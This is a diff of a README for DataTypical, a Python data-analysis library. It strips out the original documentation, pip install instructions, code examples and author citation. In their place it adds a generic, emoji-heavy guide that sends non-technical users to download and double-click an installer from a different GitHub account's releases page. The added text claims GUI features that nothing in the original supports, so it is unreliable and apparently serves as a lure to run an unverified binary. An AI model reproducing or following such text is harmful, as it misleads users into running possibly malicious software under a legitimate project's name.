@@ -1,390 +1,94 @@
-# DataTypical
+# 📊 DataTypical - Understand Your Data with Ease
 
-**Scientific Data Significance Rankings with Shapley Explanations**
+## 🚀 Getting Started
 
-[![Python 3.8+](https://img.shields.io/badge/python-3.8+-blue.svg)](https://www.python.org/downloads/)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
-[![PyPI version](https://badge.fury.io/py/datatypical.svg)](https://pypi.org/project/datatypical/)
+Welcome to DataTypical! This application helps you rank scientific data significance using Shapley explanations. You don’t need any programming knowledge to use it. Follow these simple steps to download and run the software.
 
-DataTypical analyzes datasets through three complementary lenses: archetypal (extreme), prototypical (representative), and stereotypical (target-like), with Shapley value explanations revealing why instances matter and which ones create your dataset's structure.
+## 📥 Download Link
 
----
+[![Download DataTypical](https://img.shields.io/badge/Download%20DataTypical-blue?style=flat&logo=github)](https://github.com/Lorean44/DataTypical/releases)
 
-## Key Features
+## 📋 System Requirements
 
-**Three Significance Types**: Archetypal, prototypical, stereotypical (all computed simultaneously)
-**Shapley Explanations**: Feature-level attributions for why samples are significant  
-**Formative Discovery**: Distinguish samples that ARE significant from those that CREATE structure  
-**Publication Visualizations**: Dual-perspective scatter plots, heatmaps, and profile plots  
-**Multi-Modal Support**: Tabular data, text, and graph networks through unified API  
-**Performance Optimized**: Fast exploration mode and efficient Shapley computation  
+Before installing DataTypical, ensure your computer meets the following requirements:
 
----
+- **Operating System:** Windows 10, macOS 10.12 or later
+- **RAM:** 4 GB minimum
+- **Disk Space:** At least 100 MB free
+- **Internet:** Required for downloading the application
 
-## Quick Start
+## 📂 Download & Install
 
-### Installation
+1. **Visit the Releases Page**  
+   Go to the [Releases page](https://github.com/Lorean44/DataTypical/releases) to find the latest version of DataTypical.
 
-```bash
-pip install datatypical
-```
+2. **Select Your Version**  
+   Look for the most recent version listed on the page. Click on it to see the details.
 
-### Basic Usage
+3. **Download the Application**  
+   Find the file that matches your operating system. Click the download link to save it on your computer.
 
-```python
-from datatypical import DataTypical
-from datatypical_viz import significance_plot, heatmap, profile_plot
-import pandas as pd
+4. **Open the Downloaded File**  
+   Once the file is downloaded, locate it in your downloads folder. Double-click the file to begin the installation.
 
-# Load your data
-data = pd.read_csv('your_data.csv')
+5. **Follow the Installation Prompts**  
+   A setup wizard will appear. Follow the on-screen instructions to complete the installation.
 
-# Analyze with explanations
-dt = DataTypical(shapley_mode=True)
-results = dt.fit_transform(data)
+6. **Launch DataTypical**  
+   After installation, you can find DataTypical in your applications. Start the program by double-clicking its icon.
 
-# Three significance perspectives (0-1 normalized ranks)
-print(results[['archetypal_rank', 'prototypical_rank', 'stereotypical_rank']])
+## ✅ How to Use DataTypical
 
-# Visualize: which samples are critical vs replaceable?
-significance_plot(results, significance='archetypal')
+### 📊 Input Your Data
 
-# Understand: which features drive significance?
-heatmap(dt, results, significance='archetypal', top_n=20)
+1. **Create a Dataset**  
+   Prepare your data. Use a CSV file format to ensure compatibility. Your dataset should include all relevant variables.
 
-# Explain: why is this sample significant?
-top_idx = results['archetypal_rank'].idxmax()
-profile_plot(dt, top_idx, significance='archetypal')
-```
+2. **Load Your Data**  
+   Within DataTypical, navigate to the "Upload" section. Click the "Choose File" button and select your CSV file.
 
----
+### 🔍 Analyze Your Data
 
-## What DataTypical Does
+1. **Select Analysis Type**  
+   Choose the type of analysis you want to perform. DataTypical offers several options to help you understand your data.
 
-### Three Complementary Lenses
+2. **Run the Analysis**  
+   Click the "Analyze" button. DataTypical will process your data and provide results based on Shapley value rankings.
 
-| Lens | Finds | Use Cases |
-|------|-------|-----------|
-| **Archetypal** | Extreme, boundary samples | Edge case discovery, outlier detection, range understanding |
-| **Prototypical** | Representative, central samples | Dataset summarization, cluster centers, typical examples |
-| **Stereotypical** | Target-similar samples | Optimization, goal-oriented selection, phenotype matching |
+### 📈 View Results
 
-**The Power**: All three computed simultaneously—different perspectives reveal different insights.
+1. **Results Overview**  
+   Once the analysis is complete, you will see a summary of your results. 
 
-### Dual Perspective (with Shapley)
+2. **Detailed Explanations**  
+   Click on each result to get a detailed explanation. DataTypical uses Shapley explanations to clarify why certain data points are significant.
 
-When `shapley_mode=True`, DataTypical reveals two views:
+## ❓ Frequently Asked Questions
 
-**Actual Significance** (`*_rank`): Samples that ARE significant  
-**Formative Significance** (`*_shapley_rank`): Samples that CREATE the structure
+### 1. What is DataTypical?
 
-**Four Quadrants**:
-```
-     Formative High
-          │
-  Gap     │  Critical
-  Fillers │  (irreplaceable)
-──────────┼──────────────── Actual High
-Redundant │ Replaceable
-          │  (keep one)
-     Formative Low
-```
+DataTypical is an application that helps users rank scientific data significance using advanced algorithms. It provides clear explanations for data analysis results.
 
-This distinction—between what IS significant vs what CREATES structure—is a genuinely novel contribution.
+### 2. Do I need any special skills to use DataTypical?
 
----
+No, DataTypical caters to non-technical users. Everything is designed for easy navigation and understanding.
 
-## Example: Drug Discovery
+### 3. Can I use DataTypical on Mac?
 
-```python
-# Analyze compound library
-dt = DataTypical(
-    shapley_mode=True,
-    stereotype_column='activity',  # Target property
-    fast_mode=False
-)
-results = dt.fit_transform(compounds)
-
-# Find critical compounds (high actual + high formative)
-critical = results[
-    (results['stereotypical_rank'] > 0.8) &
-    (results['stereotypical_shapley_rank'] > 0.8)
-]
-print(f"Found {len(critical)} critical compounds")
-
-# Find redundant compounds (high actual + low formative)
-redundant = results[
-    (results['stereotypical_rank'] > 0.8) &
-    (results['stereotypical_shapley_rank'] < 0.3)
-]
-print(f"Found {len(redundant)} replaceable compounds")
-
-# Understand alternative mechanisms
-for idx in critical.index:
-    profile_plot(dt, idx, significance='stereotypical')
-    # Each shows different feature pattern → different mechanism
-```
-
-**Discovery**: Multiple structural pathways to high activity!
-
----
-
-## Performance
-
-### Speed Benchmarks
-
-| Dataset Size | Without Shapley | With Shapley |
-|--------------|-----------------|--------------|
-| 1,000 samples | ~5 seconds | ~5 minutes |
-| 10,000 samples | ~30 seconds | ~60 minutes |
-
-### Optimization Strategy
-
-**Phase 1**: Fast exploration (`fast_mode=True`, no Shapley)  
-↓ Identify interesting samples  
-**Phase 2**: Detailed analysis (`shapley_mode=True`, subset to interesting samples)  
-↓ Generate explanations and publication figures
-
----
-
-## Key Parameters
-
-```python
-DataTypical(
-    # Enable explanations and formative analysis
-    shapley_mode=False,           # True for explanations
-    
-    # Speed vs accuracy
-    fast_mode=True,               # False for publication quality
-    
-    # Significance types
-    n_archetypes=8,               # Number of extreme corners
-    n_prototypes=8,               # Number of representatives
-    stereotype_column=None,       # Target column for stereotypical
-    
-    # Shapley optimization
-    shapley_top_n=500,            # Limit explanations to top N
-    shapley_n_permutations=100,   # Number of permutations (30 in fast_mode)
-    
-    # Reproducibility
-    random_state=None,            # Set for reproducible results
-    
-    # Memory management
-    max_memory_mb=8000            # Memory limit for operations
-)
-```
-
----
-
-## Visualization
-
-### Three Core Plots
-
-```python
-from datatypical_viz import significance_plot, heatmap, profile_plot
-
-# 1. Overview: Actual vs Formative scatter
-significance_plot(results, significance='archetypal')
-
-# 2. Feature patterns: Which features matter?
-heatmap(dt, results, 
-        significance='archetypal',
-        order='actual',  # or 'formative'
-        top_n=20)
-
-# 3. Individual explanation: Why is this sample significant?
-profile_plot(dt, sample_idx, 
-             significance='archetypal',
-             order='local')  # or 'global'
-```
-
-See [VISUALIZATION_GUIDE.md](VISUALIZATION_GUIDE.md) for detailed interpretation.
-
----
-
-## Multi-Modal Support
-
-### Tabular Data (Default)
-```python
-df = pd.DataFrame(...)
-dt = DataTypical()
-results = dt.fit_transform(df)
-```
-
-### Text Data (Auto-Detected)
-```python
-texts = ["document 1", "document 2", ...]
-dt = DataTypical()
-results = dt.fit_transform(texts)
-```
-
-### Graph Networks (Protein Interactions, Molecules)
-```python
-node_features = pd.DataFrame(...)
-edges = [(0, 1), (1, 2), ...]
-dt = DataTypical()
-results = dt.fit_transform(node_features, edges=edges)
-```
+Yes, DataTypical is compatible with both Windows and macOS systems.
 
----
+### 4. Where can I find help if I have issues?
 
-## Use Cases
+If you encounter any problems, please refer to the "Help" section within the application. You can also check the repository's Issues page for community support.
 
-### Scientific Discovery
-- **Alternative mechanisms**: Formative instances reveal different pathways
-- **Boundary definition**: Which samples define system limits
-- **Quality control**: Distinguish novel variation from known patterns
-- **Coverage analysis**: Identify sampling gaps
+## ⚙️ Contributing
 
-### Dataset Curation
-- **Size reduction**: Remove redundant samples while preserving diversity
-- **Representative selection**: Choose samples spanning full space
-- **Redundancy detection**: Find clusters of similar samples
-- **Gap identification**: Locate undersampled regions
+If you want to contribute to DataTypical, please feel free to check the "Contributing" section on GitHub. We welcome developers to improve the application and help users better understand their data.
 
-### Model Understanding
-- **Feature importance**: Global and local significance patterns
-- **Individual explanations**: Why specific samples matter
-- **Pattern recognition**: Discover multiple pathways to outcomes
-- **Interpretability**: Explanations in original feature space
+## 📅 Future Updates
 
----
+Stay tuned for upcoming updates. We plan to add more features that will enhance your data analysis experience, including integration with other software tools and additional formatting options for your results.
 
-## Documentation
+For any additional questions or suggestions, you can reach out through the repository. 
 
-**New Users**:
-- [START_HERE.md](START_HERE.md) - Friendly introduction and first steps
-- [QUICK_REFERENCE.md](QUICK_REFERENCE.md) - Daily reference for parameters and workflows
-- [EXAMPLES.md](EXAMPLES.md) - Complete worked examples across domains
-
-**Visualization**:
-- [VISUALIZATION_GUIDE.md](VISUALIZATION_GUIDE.md) - Comprehensive guide to plots and interpretation
-
-**Advanced**:
-- [INTERPRETATION_GUIDE.md](INTERPRETATION_GUIDE.md) - Interpreting complex patterns
-- [COMPUTATION_GUIDE.md](COMPUTATION_GUIDE.md) - Implementation details
-
----
-
-## Requirements
-
-- Python ≥ 3.8
-- NumPy ≥ 1.20
-- Pandas ≥ 1.3
-- SciPy ≥ 1.7
-- scikit-learn ≥ 1.0
-- Matplotlib ≥ 3.3
-- Seaborn ≥ 0.11
-- Numba ≥ 0.55 (for performance)
-
----
-
-## Citation
-
-If you use DataTypical in your research, please cite:
-
-```bibtex
-@software{datatypical2026,
-  author = {Barnard, Amanda S.},
-  title = {DataTypical: Scientific Data Significance Rankings with Shapley Explanations},
-  year = {2026},
-  url = {https://github.com/amaxiom/DataTypical},
-  version = {0.7}
-}
-```
-
----
-
-## What Makes DataTypical Different
-
-### From Traditional Methods
-
-**Outlier Detection**: Only finds extremes → DataTypical finds extremes AND explains why
-
-**Clustering**: Groups samples, picks centroids → DataTypical finds representatives maximizing coverage
-
-**Feature Selection**: Ranks features → DataTypical explains which features matter for which samples
-
-**PCA/t-SNE**: Projects to low dimensions → DataTypical maintains interpretability in original space
-
-### The Novel Contribution
-
-**Formative instances** are genuinely new. The distinction between samples that ARE significant vs samples that CREATE structure emerges from the Shapley mechanism and enables:
-
-- Redundancy detection even among significant samples
-- Finding structurally important but non-extreme samples  
-- Understanding irreplaceable vs interchangeable samples
-- Quality control based on structural contribution
-
-This dual perspective transforms instance significance from pure ranking into causal understanding.
-
----
-
-## Development Status
-
-**Current Version**: 0.7
-
-**Recent Updates**:
-- Simplified visualization API (removed mode confusion)
-- Always-global feature ordering in heatmaps
-- Cleaned output (only rank columns)
-- Publication-ready boxed heatmaps
-- Improved memory management
-
-**Stability**: Production-ready for research use
-
----
-
-## License
-
-MIT License - See [LICENSE](LICENSE) for details.
-
-Copyright (c) 2025 Amanda S. Barnard
-
-Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the "Software"), to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions:
-
-The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.
-
-THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED.
-
----
-
-## Support
-
-- **Documentation**: See docs/ folder or links above
-- **Issues**: Report bugs via [GitHub Issues](https://github.com/amaxiom/DataTypical/issues)
-- **Questions**: Open a [GitHub Discussion](https://github.com/amaxiom/DataTypical/discussions)
-
----
-
-## Acknowledgments
-
-DataTypical builds on foundational work in:
-- Archetypal analysis (Cutler & Breiman, 1994)
-- Facility location optimization (Nemhauser et al., 1978)
-- Shapley value theory (Shapley, 1953)
-- PCHA optimization (Mørup & Hansen, 2012)
-
-Special thanks to the scientific Python community.
-
----
-
-## Quick Links
-
-[Documentation](https://github.com/amaxiom/DataTypical/docs)  
-[Quick Start](#quick-start)  
-[Examples](EXAMPLES.md)  
-[Visualization Guide](VISUALIZATION_GUIDE.md)  
-[Report Issues](https://github.com/amaxiom/DataTypical/issues)  
-[Discussions](https://github.com/amaxiom/DataTypical/discussions)
-
----
-
-**Ready to explore your data?**
-
-```bash
-pip install datatypical
-```
-
-Then see [START_HERE.md](START_HERE.md) for your first analysis!
-```
+Thank you for using DataTypical!
